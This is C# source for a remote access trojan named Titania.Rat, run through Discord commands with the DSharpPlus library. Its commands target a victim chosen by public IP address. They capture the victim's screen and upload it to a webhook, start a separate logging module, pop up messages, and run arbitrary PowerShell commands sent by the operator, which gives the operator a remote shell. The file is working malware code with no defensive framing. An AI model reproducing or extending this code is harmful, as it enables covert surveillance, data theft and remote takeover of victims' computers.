using DSharpPlus.CommandsNext;
using DSharpPlus.CommandsNext.Attributes;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using DSharpPlus.Interactivity;
using DSharpPlus;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using System.Diagnostics;
using System.Drawing;
using System.Management;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Contexts;
using Titania.Logging;
using DSharpPlus.Entities;
using System.Windows;
using System.Windows.Forms;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Net.Http.Headers;
using System.Text.RegularExpressions;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using Newtonsoft.Json;
using Webhook;
using System.Security.Cryptography;
using System.Net.Http;
using Image = System.Drawing.Image;
using System.Drawing.Imaging;
namespace Titania.Rat
{
    internal class RattedCmds : BaseCommandModule
    {
        [Command("screenshot")]
        public async Task Screenshotcmd(CommandContext ctx, string RATTEDIP)
        {
            if (RATTEDIP +"\n" == GetIP().ToString())
            {
                string currentdir = Environment.CurrentDirectory;
                string webhook = "";
                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics graphics = Graphics.FromImage(bitmap as Image);
                graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                bitmap.Save(currentdir + "/screenshot.jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
                string FilePath = currentdir + "/screenshot.jpeg";
                using (HttpClient httpClient = new HttpClient())
                {
                    MultipartFormDataContent form = new MultipartFormDataContent();
                    var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                    form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "LeakyLeaky.jpeg");
                    httpClient.PostAsync(webhook, form).Wait();
                    httpClient.Dispose();
                }
                File.Delete(currentdir + "/screenshot.jpeg");
            }
           

        }
        [Command("log")]
        public async Task grabinfo(CommandContext ctx, string RATTEDIP)
        {
            if (RATTEDIP + "\n" == GetIP().ToString())
            {
                Titania.Logging.MainLogger.Titania();
            }
        }
        [Command("msg")]
        public async Task msgrat(CommandContext ctx, string RATTEDIP,string Message)
        {
            if (RATTEDIP + "\n" == GetIP().ToString())
            {
                MessageBox.Show(Message.Replace("_", ""));
            }
        }

        [Command("shell")]
        public async Task rshelluwuwdaddy(CommandContext ctx, string RATTEDIP, string e)
        {
            if (RATTEDIP + "\n" == GetIP().ToString())
            {
                string command = e.Replace("{s}", " ");
                Process.Start("powershell.exe", command);
            }
        }



        public static string GetIP()
        {

            using (WebClient webclient = new WebClient())
            {
                string ip = webclient.DownloadString("https://ipv4.wtfismyip.com/text");
                return ip;
            }


        }
    }
}
